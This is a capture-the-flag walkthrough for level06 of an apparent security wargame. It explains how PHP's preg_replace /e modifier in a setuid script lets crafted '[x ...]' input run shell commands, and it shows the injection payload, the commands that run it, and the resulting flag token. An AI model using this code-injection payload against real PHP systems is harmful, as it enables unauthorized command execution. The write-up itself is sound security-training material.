
->ls -la

we find two interesting lines :

-rwsr-x---+ 1 flag06 level06 ... level06
-rwsr-x---  1 flag06 level06 ... level06.php

-> cat level06.php

<?php                                                                     # Opening php tag, this is the beginning of the script
	function y($m) {
		$m = preg_replace("/\./", " x ", $m);                     # `/\./` matches the character '.' literally (case sensitive) => replace the first '.' by " x "
		$m = preg_replace("/@/", " y", $m);                       # `/@/` matches the character @ literally (case sensitive) => replace the first '@' by " y"
		return $m;
	}
	function x($y, $z) {
		$a = file_get_contents($y);                               # `file_get_contents()` reads entire file and return it into a string
		$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);   # regex will evaluate any string arranged in the form "[x (.)]", interpret it as PHP code and call the 'y' function with "." as parameter.
		$a = preg_replace("/\[/", "(", $a);                       # `/\[/` matches the character [ literally (case sensitive) => replace the first '[' by '('
		$a = preg_replace("/\]/", ")", $a);                       # `/\]/` matches the character ] literally (case sensitive) => replace the first ']' by ')'
		return $a;
	}
	$r = x($argv[1], $argv[2]);                                       # call the function x *the second line will print the result*
	print $r;
?>                                                                        # closing php tag, end of the script

So, after inspecting the code, we can see that it's actually posible 
to inject something this code, so we can exploit it.

This is possible because The /e transforms the replacement string into 
executed PHP code — so if we get to control the text captured between 
[x ...], we can close the string and inject code.

So let's try :

-> echo '[x ${`getflag`}]' > /tmp/getflag

-> ./level06 /tmp/getflag

PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
in /home/user/level06/level06.php(4) : regexp code on line 1

-> su level07 ..